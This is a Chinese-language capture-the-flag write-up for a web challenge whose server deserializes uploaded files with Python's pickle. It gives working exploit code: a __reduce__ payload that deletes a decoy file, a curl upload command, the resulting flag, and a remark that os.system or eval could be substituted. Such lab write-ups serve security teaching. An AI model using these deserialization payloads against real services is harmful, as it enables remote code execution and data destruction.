## 题解

### 入口与指纹

`uvicorn`，页面标题 **`Pickle CTF`**。首页直接把「读 flag 的代码」贴出来了：

```python
if os.path.exists('decoy.txt'):
    flag = open('decoy.txt').read()
else:
    flag = open('flag.txt').read()
```

页面顶部显示 `The current flag is: this is just the decoy` —— 说明 `decoy.txt` 存在，
所以读到的是假 flag。

上传入口是 multipart：

```html
<form action="/" method="post" enctype="multipart/form-data">
  <input type="file" name="pickle_file">
</form>
```

`/openapi.json` 只有 `GET/POST /` 和 `GET /ping`。

### 关键观察

**1. 服务端直接 `pickle.loads` 上传内容。**

题目名和表单字段（`pickle_file`）都指向标准 `pickle` 反序列化。
**不需要 RCE 反弹**——只要能影响上面那段读文件的逻辑就行。

**2. 读取顺序给了最简单的解法：把 `decoy.txt` 删掉。**

```python
if os.path.exists('decoy.txt'):   # 删掉就走 else
    flag = open('decoy.txt').read()
else:
    flag = open('flag.txt').read()
```

所以构造一个 `__reduce__` 返回 `(os.remove, ('decoy.txt',))` 的 pickle：

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.remove, ('decoy.txt',))

open('p.pkl', 'wb').write(pickle.dumps(Exploit()))
```

上传后，服务端 `pickle.loads` 执行 `os.remove('decoy.txt')`；
紧接着它按上面那段逻辑读文件，此时 `decoy.txt` 已不存在 → 读到 `flag.txt`。

### 利用链

```bash
T=$(head -1 .target)

python3 - <<'PY'
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.remove, ('decoy.txt',))
open('/tmp/p.pkl', 'wb').write(pickle.dumps(Exploit()))
PY

curl -sS -X POST -F 'pickle_file=@/tmp/p.pkl;filename=p.pkl' "http://$T/" \
| grep -o 'current flag is:.*'
```

```text
The current flag is: flag{7fd36c45-1510-41be-a100-dabb9335aa7b}
```

（先用一个普通字符串 pickle 上传过，页面仍显示 decoy，说明上传通道和反序列化都正常。）

### flag 位置

容器内 `flag.txt`。页面每次请求都会重新判断 `decoy.txt` 是否存在，
所以删掉后立即回显真 flag。

## 复盘

- **题目把源码贴出来，就是让你读逻辑而不是猜漏洞。** 这里 `os.path.exists('decoy.txt')`
  是唯一的岔路：删 decoy 比 RCE 读文件更短，而且不需要输出通道。
- **`pickle.loads` 的 `__reduce__` 是最小 RCE 原语。** 返回值只要写成
  `(callable, args)`，反序列化时就会执行 `callable(*args)`。
  本例用 `os.remove`，也可以换成 `os.system`/`eval`。
- **有「读文件」逻辑时，优先改环境而不是读文件。** 如果环境里有「优先读 A 再读 B」的分支，
  删除/重命名 A 往往比想办法直接读 B 更省事。
- **先上传一个无害 pickle 做对照。** 我第一个请求用的是 `pickle.dumps("hello")`，
  页面仍显示 decoy —— 这确认了「上传被成功反序列化、但没有副作用」，
  再上 `os.remove` 就能确定变化来自我的 payload。
- **不需要反弹 shell。** 目标只是让程序读到 `flag.txt`，页面本身就把结果显示出来了。
